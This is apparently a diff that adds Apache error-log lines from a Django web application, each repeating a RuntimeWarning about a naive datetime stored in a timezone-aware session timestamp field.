+[Thu Jul 09 23:48:13.549503 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:48:13.549511 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:48:14.138642 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:48:14.138133) while time zone support is active.
+[Thu Jul 09 23:48:14.138681 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:48:14.138689 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:48:19.100225 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:48:19.099726) while time zone support is active.
+[Thu Jul 09 23:48:19.100264 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:48:19.100272 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:48:19.561461 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:48:19.560875) while time zone support is active.
+[Thu Jul 09 23:48:19.561520 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:48:19.561527 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:48:33.848560 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:48:33.848030) while time zone support is active.
+[Thu Jul 09 23:48:33.848657 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:48:33.848675 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:48:34.484983 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:48:34.484461) while time zone support is active.
+[Thu Jul 09 23:48:34.485023 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:48:34.485030 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:49:04.432308 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:49:04.431809) while time zone support is active.
+[Thu Jul 09 23:49:04.432349 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:49:04.432357 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:49:05.243743 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:49:05.243172) while time zone support is active.
+[Thu Jul 09 23:49:05.243790 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:49:05.243798 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:51:03.220702 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:51:03.220152) while time zone support is active.
+[Thu Jul 09 23:51:03.220748 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:51:03.220756 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:51:03.744282 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:51:03.743749) while time zone support is active.
+[Thu Jul 09 23:51:03.744330 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:51:03.744337 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:51:08.892374 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:51:08.891782) while time zone support is active.
+[Thu Jul 09 23:51:08.892546 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:51:08.892788 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:51:10.471303 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:51:10.470623) while time zone support is active.
+[Thu Jul 09 23:51:10.471375 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:51:10.471383 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:51:47.208005 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:51:47.207455) while time zone support is active.
+[Thu Jul 09 23:51:47.208035 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:51:47.208042 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:51:48.365861 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:51:48.365250) while time zone support is active.
+[Thu Jul 09 23:51:48.365909 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:51:48.365921 2015] [:error] [pid 19496] 
